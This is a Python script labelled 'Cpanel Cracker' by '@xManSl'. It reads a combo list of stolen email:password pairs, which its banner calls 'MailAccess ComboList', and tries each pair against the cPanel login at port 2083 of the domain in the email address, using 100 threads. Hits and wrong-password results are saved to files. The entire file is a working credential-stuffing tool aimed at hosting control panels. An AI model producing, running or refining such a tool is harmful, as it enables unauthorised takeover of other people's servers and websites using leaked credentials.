import requests, os,random,ctypes,colored
import colorama
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor

bannar_color =[
colored.fg("magenta") + colored.attr("bold"),
colored.fg("orchid")  + colored.attr("bold"),
colored.fg("cyan")    + colored.attr("bold"),
colored.fg("yellow")  + colored.attr("bold"),
colored.fg("red") + colored.attr("bold"),
colored.fg("white")   + colored.attr("bold"),
colored.fg("green")   + colored.attr("bold"),
colored.fg("green") + colored.attr("bold"),
colored.fg("blue") + colored.attr("bold"),
colored.fg("plum_3")  + colored.attr("bold"),
colored.fg("White") + colored.attr("bold"),
colored.fg("White") + colored.attr("bold"),
colored.fg("White") + colored.attr("bold"),
colored.fg("blue")    + colored.attr("bold"),
colored.fg("White") + colored.bg("cyan")+colored.attr("bold"),]
W = bannar_color[3] #yellow
Y = bannar_color[0] #magenta
B = bannar_color[2] #cyan
G = bannar_color[6] #green
R = bannar_color[4] #red
M = bannar_color[7] ##aa557f
X = bannar_color[8] ##33ff29
Z = bannar_color[9] ##ff1d00
Q = bannar_color[10]##ab01ff
GG = bannar_color[11]##c81d59
WI = bannar_color[5]#white
BOOLD = bannar_color[12]
bl = bannar_color[-2]
F = bannar_color[-1]

if not os.path.exists('Result'):
    os.mkdir('Result')

colorama.init()

head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
TOTAL = 0
WORK = 0
WRONG = 0
BAD = 0


def checker(line):
    global TOTAL
    global WORK
    global WRONG
    global BAD
       
    spl = line.split('@')
    user = spl[0]
    url = spl[1].split(':')[0]
    miniurl = url+':2083'
    url = 'https://'+url + ':2083/login/?login_only=1'
    passw = line.split(':')[1]


    
    data = f'user={user}&pass={passw}&goto_uri=%2F'
    try:
        r = requests.post(url,headers=head,data=data,allow_redirects=False).text

        result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Checked By @xManSl\n\n'

        if '{"notices":[]' in r or 'security_token":"' in r:
            print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
            WORK +=1
            TOTAL +=1

            save = open('Result/Work Cpanels.txt','a')
            save.write(result)
            save.close()
        if 'invalid_login' in r:
            print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX}FOUND CPANEL BUT WRONG PASSWORD")
            WRONG +=1
            TOTAL +=1
            save = open('Result/Cpanels WrongPassword.txt','a')
            save.write(result)
            save.close()
    except:
        print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}<{Fore.LIGHTCYAN_EX}]{Fore.LIGHTRED_EX}[BAD]{Fore.LIGHTWHITE_EX} {miniurl}')
        BAD +=1
        TOTAL +=1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cpanel Cracker By: [@xManSl] | Checked {TOTAL}\\{num} \\ WORK {WORK} \\ WrongPASS {WRONG} \\ BAD {BAD}')


def main():
    global num
    if os.name == 'nt':
        os.system('cls')
    else:os.system('clear')
    os.system('mode con:cols=130 lines=30')
    ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker By: [@xManSl]')
    x = f'''                                                                                                                                                                                                                        
{Fore.LIGHTBLUE_EX}   ____                                        ___          ____                            ___                      
{Fore.LIGHTCYAN_EX}  6MMMMb/                                      `MM         6MMMMb/                          `MM                      
{Fore.LIGHTGREEN_EX} 8P    YM                                       MM        8P    YM                           MM                      
{Fore.LIGHTMAGENTA_EX}6M      Y __ ____      ___   ___  __     ____   MM       6M      Y ___  __    ___     ____   MM   __   ____  ___  __ 
{Fore.LIGHTCYAN_EX}MM        `M6MMMMb   6MMMMb  `MM 6MMb   6MMMMb  MM       MM        `MM 6MM  6MMMMb   6MMMMb. MM   d'  6MMMMb `MM 6MM 
{Fore.LIGHTRED_EX}MM         MM'  `Mb 8M'  `Mb  MMM9 `Mb 6M'  `Mb MM       MM         MM69 " 8M'  `Mb 6M'   Mb MM  d'  6M'  `Mb MM69 " 
{Fore.LIGHTYELLOW_EX}MM         MM    MM     ,oMM  MM'   MM MM    MM MM       MM         MM'        ,oMM MM    `' MM d'   MM    MM MM'    
{Fore.LIGHTGREEN_EX}MM         MM    MM ,6MM9'MM  MM    MM MMMMMMMM MM       MM         MM     ,6MM9'MM MM       MMdM.   MMMMMMMM MM     
{Fore.LIGHTMAGENTA_EX}YM      6  MM    MM MM'   MM  MM    MM MM       MM       YM      6  MM     MM'   MM MM       MMPYM.  MM       MM     
{Fore.LIGHTCYAN_EX} 8b    d9  MM.  ,M9 MM.  ,MM  MM    MM YM    d9 MM        8b    d9  MM     MM.  ,MM YM.   d9 MM  YM. YM    d9 MM     
{Fore.LIGHTYELLOW_EX}  YMMMM9   MMYMMM9  `YMMM9'Yb_MM_  _MM_ YMMMM9 _MM_        YMMMM9  _MM_    `YMMM9'Yb.YMMMM9 _MM_  YM._YMMMM9 _MM_    
{Fore.LIGHTBLUE_EX}           MM                                                                                                        
{Fore.LIGHTCYAN_EX}           MM                                                                                                        
{Fore.LIGHTYELLOW_EX}          _MM_                                            {Fore.LIGHTCYAN_EX}TG: {X}[{Y}@xManSl{X}]    {WI}  
                                                {R}#Use Only MailAccess ComboList{WI} 
                                
'''

    print(x)
    lista = input('List! ')
    if os.name == 'nt':
        os.system('cls')
    else:os.system('clear')
    with open(lista,'r') as f:
        lines = f.read().splitlines()
        num = len(lines)
    with ThreadPoolExecutor(max_workers=100) as p:
        p.map(checker,lines)
main()